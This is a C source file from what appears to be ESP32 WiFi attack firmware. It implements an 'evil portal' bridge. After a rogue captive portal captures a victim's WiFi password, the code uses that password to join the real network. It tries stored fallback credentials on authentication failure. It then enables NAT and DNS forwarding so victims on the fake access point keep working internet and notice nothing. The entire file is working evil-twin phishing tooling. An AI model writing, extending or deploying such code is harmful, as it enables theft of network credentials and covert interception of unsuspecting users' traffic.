#include "wlan_evil_portal_bridge.h"
#include "wlan_app.h"
#include "wlan_hal.h"
#include <esp_wifi.h>
#include <esp_event.h>
#include <esp_netif.h>
#include <esp_log.h>
#include <string.h>
#include <errno.h>
#include <lwip/sockets.h>
#include <lwip/inet.h>
#include <freertos/task.h>

#define BRIDGE_TAG "evil_portal_bridge"

static bool s_bridge_active = false;
static bool s_bridge_attempting = false;
static bool s_bridge_prewarmed = false;   // STA up + IP, but NAPT/DNS-fwd not yet enabled
static bool s_pending_activate = false;   // start() arrived while attempting; activate on IP
static esp_netif_t* s_ap_netif = NULL;
static ip_event_got_ip_t s_last_ip_event = {0};

static char s_last_ssid[33] = {0};
static char s_last_password[65] = {0};

static char s_fallback_ssid[33] = {0};
static char s_fallback_password[65] = {0};
static bool s_fallback_tried = false;

static void bridge_sta_event_handler(void* arg, esp_event_base_t base,
                                      int32_t event_id, void* event_data);
static void bridge_ip_event_handler(void* arg, esp_event_base_t base,
                                     int32_t event_id, void* event_data);

// All WiFi-state mutations (esp_wifi_set_mode/set_config/connect/disconnect,
// esp_netif_create_default_wifi_sta) MUST run on the HAL worker. Calling them
// directly from the httpd task (where cred_cb fires) or the WiFi event task
// (where bridge_sta_event_handler fires) corrupts WiFi driver state — this
// is a documented ESP-IDF constraint for esp_wifi_* calls.

typedef struct {
    char ssid[33];
    char password[65];
} BridgeConnectArgs;

static void bridge_start_worker(void* arg) {
    BridgeConnectArgs* a = (BridgeConnectArgs*)arg;

    if(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF") == NULL) {
        esp_netif_create_default_wifi_sta();
    }
    esp_err_t mode_err = esp_wifi_set_mode(WIFI_MODE_APSTA);
    ESP_LOGI(BRIDGE_TAG, "set APSTA mode: %s", esp_err_to_name(mode_err));

    // Dedup handlers: unregister any prior registration before re-registering
    // so we don't end up with two callbacks firing per event.
    esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, bridge_sta_event_handler);
    esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, bridge_sta_event_handler);
    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, bridge_ip_event_handler);
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED,
                                bridge_sta_event_handler, NULL);
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED,
                                bridge_sta_event_handler, NULL);
    esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP,
                                bridge_ip_event_handler, NULL);

    wifi_config_t sta_cfg = {0};
    strncpy((char*)sta_cfg.sta.ssid, a->ssid, sizeof(sta_cfg.sta.ssid) - 1);
    strncpy((char*)sta_cfg.sta.password, a->password, sizeof(sta_cfg.sta.password) - 1);
    esp_err_t cfg_err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
    esp_err_t conn_err = esp_wifi_connect();
    ESP_LOGI(BRIDGE_TAG, "set_config=%s connect=%s ssid='%s'",
             esp_err_to_name(cfg_err), esp_err_to_name(conn_err), a->ssid);
}

static void bridge_fallback_worker(void* arg) {
    BridgeConnectArgs* a = (BridgeConnectArgs*)arg;
    wifi_config_t sta_cfg = {0};
    strncpy((char*)sta_cfg.sta.ssid, a->ssid, sizeof(sta_cfg.sta.ssid) - 1);
    strncpy((char*)sta_cfg.sta.password, a->password, sizeof(sta_cfg.sta.password) - 1);
    esp_err_t cfg_err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
    esp_err_t conn_err = esp_wifi_connect();
    ESP_LOGI(BRIDGE_TAG, "trying fallback creds set_config=%s connect=%s ssid='%s' pwlen=%d",
             esp_err_to_name(cfg_err), esp_err_to_name(conn_err),
             a->ssid, (int)strlen(a->password));
}

static void bridge_disconnect_worker(void* arg) {
    (void)arg;
    esp_wifi_disconnect();
}

static void bridge_try_fallback(void) {
    if(s_fallback_tried) {
        ESP_LOGI(BRIDGE_TAG, "fallback already attempted this session; not retrying");
        return;
    }
    if(s_fallback_ssid[0] == '\0' || s_fallback_password[0] == '\0') {
        ESP_LOGI(BRIDGE_TAG, "no fallback configured");
        return;
    }
    s_fallback_tried = true;
    s_bridge_attempting = true;

    BridgeConnectArgs args = {0};
    strncpy(args.ssid, s_fallback_ssid, sizeof(args.ssid) - 1);
    strncpy(args.password, s_fallback_password, sizeof(args.password) - 1);
    wlan_hal_run_in_worker(bridge_fallback_worker, &args);
}

static void bridge_sta_event_handler(void* arg, esp_event_base_t base,
                                      int32_t event_id, void* event_data) {
    UNUSED(arg); UNUSED(base);
    if(event_id == WIFI_EVENT_STA_CONNECTED) {
        // L2 connect succeeded. NAPT enable is deferred to IP_EVENT_STA_GOT_IP
        // so the STA has its address and default route before we wire forwarding —
        // calling esp_netif_napt_enable() too early silently no-ops the route setup.
        ESP_LOGI(BRIDGE_TAG, "STA L2 connected, waiting for IP");
        return;
    }
    if(event_id == WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t* ev = (wifi_event_sta_disconnected_t*)event_data;
        uint8_t reason = ev ? ev->reason : 0;
        ESP_LOGI(BRIDGE_TAG, "STA disconnected reason=%u", reason);
        if(s_ap_netif) esp_netif_napt_disable(s_ap_netif);
        wlan_hal_evil_portal_set_dns_upstream(0); // back to hijack
        s_bridge_active = false;
        s_bridge_attempting = false;
        s_bridge_prewarmed = false;

        // Auth-failure reasons: try fallback once if configured.
        // 2=AUTH_EXPIRE, 15=4WAY_HANDSHAKE_TIMEOUT, 201=NO_AP_FOUND, 202=AUTH_FAIL,
        // 204=HANDSHAKE_TIMEOUT, 205=CONNECTION_FAIL
        if(reason == 2 || reason == 15 || reason == 201 || reason == 202 ||
           reason == 204 || reason == 205) {
            bridge_try_fallback();
            return;
        }

        // Non-auth disconnect: cancel ESP-IDF auto-retry so it doesn't fight the AP.
        wlan_hal_run_in_worker(bridge_disconnect_worker, NULL);
        return;
    }
}

static void bridge_activate(void) {
    if(s_bridge_active) return;
    esp_netif_t* ap_netif  = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if(!ap_netif || !sta_netif) {
        ESP_LOGE(BRIDGE_TAG, "activate: netif lookup failed ap=%p sta=%p", ap_netif, sta_netif);
        return;
    }
    s_ap_netif = ap_netif;

    // Official softap_sta DHCPS dance: stop dhcps, set DNS option, set DNS info,
    // restart dhcps, THEN napt_enable. Without this, esp_netif_napt_enable
    // returns ESP_OK but no packets forward. Ref: ESP-IDF examples/wifi/softap_sta
    // + GitHub issue #12160 (silent NAPT no-op).
    esp_netif_dns_info_t dns = {0};
    esp_err_t dns_err = esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns);
    ESP_LOGI(BRIDGE_TAG, "activate: upstream dns_main=" IPSTR " err=%s",
             IP2STR(&dns.ip.u_addr.ip4), esp_err_to_name(dns_err));

    uint8_t dhcps_offer = 0x02; // DHCPS_OFFER_DNS
    esp_netif_dhcps_stop(ap_netif);
    esp_err_t opt_err = esp_netif_dhcps_option(
        ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
        &dhcps_offer, sizeof(dhcps_offer));
    esp_err_t set_dns_err = esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns);
    esp_err_t dhcps_err = esp_netif_dhcps_start(ap_netif);
    ESP_LOGI(BRIDGE_TAG, "dhcps restart: option=%s set_dns=%s start=%s",
             esp_err_to_name(opt_err), esp_err_to_name(set_dns_err), esp_err_to_name(dhcps_err));

    esp_err_t napt_err = esp_netif_napt_enable(ap_netif);
    ESP_LOGI(BRIDGE_TAG, "napt_enable=%s", esp_err_to_name(napt_err));
    if(napt_err == ESP_OK) {
        s_bridge_active = true;
        ESP_LOGI(BRIDGE_TAG, "NAT bridge active");
        if(dns_err == ESP_OK && dns.ip.u_addr.ip4.addr != 0) {
            wlan_hal_evil_portal_set_dns_upstream(dns.ip.u_addr.ip4.addr);
        }
    } else {
        ESP_LOGE(BRIDGE_TAG, "NAT bridge FAILED: %s", esp_err_to_name(napt_err));
    }
}

static void bridge_activate_worker(void* arg) {
    UNUSED(arg);
    bridge_activate();
}

static void bridge_ip_event_handler(void* arg, esp_event_base_t base,
                                     int32_t event_id, void* event_data) {
    UNUSED(arg); UNUSED(base);
    if(event_id != IP_EVENT_STA_GOT_IP) return;

    ip_event_got_ip_t* ev = (ip_event_got_ip_t*)event_data;
    s_last_ip_event = *ev;
    ESP_LOGI(BRIDGE_TAG, "STA got IP " IPSTR " gw=" IPSTR " mask=" IPSTR " pending_activate=%d",
             IP2STR(&ev->ip_info.ip), IP2STR(&ev->ip_info.gw), IP2STR(&ev->ip_info.netmask),
             s_pending_activate);

    s_bridge_prewarmed = true;

    // If start() already fired (cred capture happened before STA was up), or
    // this is the original non-prewarm flow, activate immediately. Otherwise
    // stay in prewarmed state until start() arrives.
    if(s_pending_activate) {
        bridge_activate();
        s_pending_activate = false;
    } else {
        ESP_LOGI(BRIDGE_TAG, "prewarmed: STA up, NAPT held off until cred capture");
    }
    s_bridge_attempting = false;

    // Self-test: from the firmware itself, try a TCP connect to 1.1.1.1:80.
    // This proves the STA side has real upstream internet (independent of any
    // client and NAPT). If this fails, the issue is STA/upstream, not NAPT.
    // If this succeeds but external clients still can't reach 1.1.1.1,
    // the issue is NAPT translation or routing.
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        ESP_LOGE(BRIDGE_TAG, "selftest: socket() failed errno=%d", errno);
        return;
    }
    struct timeval tv = {.tv_sec = 5, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(80);
    dst.sin_addr.s_addr = inet_addr("1.1.1.1");
    int cr = connect(sock, (struct sockaddr*)&dst, sizeof(dst));
    if(cr == 0) {
        ESP_LOGI(BRIDGE_TAG, "selftest: TCP connect to 1.1.1.1:80 OK (STA internet works)");
    } else {
        ESP_LOGE(BRIDGE_TAG, "selftest: TCP connect to 1.1.1.1:80 FAILED rc=%d errno=%d", cr, errno);
    }
    close(sock);

    // DNS warmup: fire a UDP DNS query for google.com to 1.1.1.1:53 from the
    // STA interface. This primes the lwIP route + NAT state for the first
    // client-originated DNS query that the evil_portal forwarder will make
    // shortly. Without this, the first client query times out (it takes a
    // few seconds for the upstream / Cloudflare path to "warm up") and the
    // post-cred bridge_redirect page redirects before DNS-fwd is hot.
    int dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(dns_sock >= 0) {
        struct timeval dtv = {.tv_sec = 3, .tv_usec = 0};
        setsockopt(dns_sock, SOL_SOCKET, SO_RCVTIMEO, &dtv, sizeof(dtv));
        // Bind to STA IP so source is right.
        struct sockaddr_in bind_addr = {0};
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_addr.s_addr = ev->ip_info.ip.addr;
        bind_addr.sin_port = 0;
        bind(dns_sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr));
        struct sockaddr_in dns_dst = {0};
        dns_dst.sin_family = AF_INET;
        dns_dst.sin_port = htons(53);
        dns_dst.sin_addr.s_addr = inet_addr("1.1.1.1");
        // Minimal DNS query: header (12 bytes) + QNAME "google.com" + QTYPE A + QCLASS IN
        uint8_t q[] = {
            0x12, 0x34, 0x01, 0x00,        // id, flags (standard query)
            0x00, 0x01, 0x00, 0x00,        // qdcount=1, ancount=0
            0x00, 0x00, 0x00, 0x00,        // nscount=0, arcount=0
            0x06, 'g','o','o','g','l','e',  // label "google"
            0x03, 'c','o','m',              // label "com"
            0x00,                           // null terminator
            0x00, 0x01, 0x00, 0x01,        // qtype=A, qclass=IN
        };
        if(connect(dns_sock, (struct sockaddr*)&dns_dst, sizeof(dns_dst)) == 0) {
            if(send(dns_sock, q, sizeof(q), 0) == sizeof(q)) {
                uint8_t rb[256];
                int rn = recv(dns_sock, rb, sizeof(rb), 0);
                ESP_LOGI(BRIDGE_TAG, "warmup: DNS google.com -> %d bytes from 1.1.1.1", rn);
            }
        }
        close(dns_sock);
    }
}

void wlan_evil_portal_bridge_set_fallback(const char* ssid, const char* password) {
    if(ssid && ssid[0]) {
        strncpy(s_fallback_ssid, ssid, sizeof(s_fallback_ssid) - 1);
        s_fallback_ssid[sizeof(s_fallback_ssid) - 1] = '\0';
    } else {
        s_fallback_ssid[0] = '\0';
    }
    if(password && password[0]) {
        strncpy(s_fallback_password, password, sizeof(s_fallback_password) - 1);
        s_fallback_password[sizeof(s_fallback_password) - 1] = '\0';
    } else {
        s_fallback_password[0] = '\0';
    }
    ESP_LOGI(BRIDGE_TAG, "fallback set: ssid='%s' pwlen=%d",
             s_fallback_ssid, (int)strlen(s_fallback_password));
}

void wlan_evil_portal_bridge_prewarm(WlanApp* app, const char* real_ssid, const char* password) {
    UNUSED(app);
    ESP_LOGI(BRIDGE_TAG, "bridge_prewarm ssid='%s' pwlen=%d active=%d attempting=%d prewarmed=%d",
             real_ssid ? real_ssid : "(null)",
             password ? (int)strlen(password) : -1,
             s_bridge_active, s_bridge_attempting, s_bridge_prewarmed);
    if(!real_ssid || !password || real_ssid[0] == '\0') return;
    if(s_bridge_active || s_bridge_attempting || s_bridge_prewarmed) return;

    strncpy(s_last_ssid, real_ssid, sizeof(s_last_ssid) - 1);
    s_last_ssid[sizeof(s_last_ssid) - 1] = '\0';
    strncpy(s_last_password, password, sizeof(s_last_password) - 1);
    s_last_password[sizeof(s_last_password) - 1] = '\0';
    s_fallback_tried = false;

    s_bridge_attempting = true;
    s_pending_activate = false;

    BridgeConnectArgs args = {0};
    strncpy(args.ssid, real_ssid, sizeof(args.ssid) - 1);
    strncpy(args.password, password, sizeof(args.password) - 1);
    wlan_hal_run_in_worker(bridge_start_worker, &args);
}

void wlan_evil_portal_bridge_start(WlanApp* app, const char* real_ssid, const char* password) {
    UNUSED(app);
    ESP_LOGI(BRIDGE_TAG, "bridge_start ssid='%s' pwlen=%d active=%d attempting=%d prewarmed=%d",
             real_ssid ? real_ssid : "(null)",
             password ? (int)strlen(password) : -1,
             s_bridge_active, s_bridge_attempting, s_bridge_prewarmed);
    if(!real_ssid || !password || real_ssid[0] == '\0') {
        ESP_LOGI(BRIDGE_TAG, "bridge_start early return: real_ssid or password missing");
        return;
    }
    if(s_bridge_active) {
        ESP_LOGI(BRIDGE_TAG, "bridge already active; ignoring new attempt");
        return;
    }

    // Fast path: STA already connected via prewarm. Just activate NAPT + DNS forward.
    if(s_bridge_prewarmed) {
        ESP_LOGI(BRIDGE_TAG, "prewarmed path: activating NAPT now");
        wlan_hal_run_in_worker(bridge_activate_worker, NULL);
        return;
    }

    // Prewarm in flight: mark to activate as soon as IP arrives.
    if(s_bridge_attempting) {
        ESP_LOGI(BRIDGE_TAG, "bridge attempt in flight; will activate on IP arrival");
        s_pending_activate = true;
        return;
    }

    // Cold path: no prewarm happened. Original flow.
    if(strcmp(real_ssid, s_last_ssid) != 0 || strcmp(password, s_last_password) != 0) {
        s_fallback_tried = false;
    }
    strncpy(s_last_ssid, real_ssid, sizeof(s_last_ssid) - 1);
    s_last_ssid[sizeof(s_last_ssid) - 1] = '\0';
    strncpy(s_last_password, password, sizeof(s_last_password) - 1);
    s_last_password[sizeof(s_last_password) - 1] = '\0';

    s_bridge_attempting = true;
    s_pending_activate = true;

    BridgeConnectArgs args = {0};
    strncpy(args.ssid, real_ssid, sizeof(args.ssid) - 1);
    strncpy(args.password, password, sizeof(args.password) - 1);
    wlan_hal_run_in_worker(bridge_start_worker, &args);
}

void wlan_evil_portal_bridge_stop(void) {
    esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, bridge_sta_event_handler);
    esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_DISCONNECTED, bridge_sta_event_handler);
    esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, bridge_ip_event_handler);
    if(s_ap_netif) esp_netif_napt_disable(s_ap_netif);
    wlan_hal_run_in_worker(bridge_disconnect_worker, NULL);
    s_bridge_active = false;
    s_bridge_attempting = false;
    s_bridge_prewarmed = false;
    s_pending_activate = false;
    s_fallback_tried = false;
    s_last_ssid[0] = '\0';
    s_last_password[0] = '\0';
    s_ap_netif = NULL;
}

bool wlan_evil_portal_bridge_is_active(void) {
    return s_bridge_active;
}
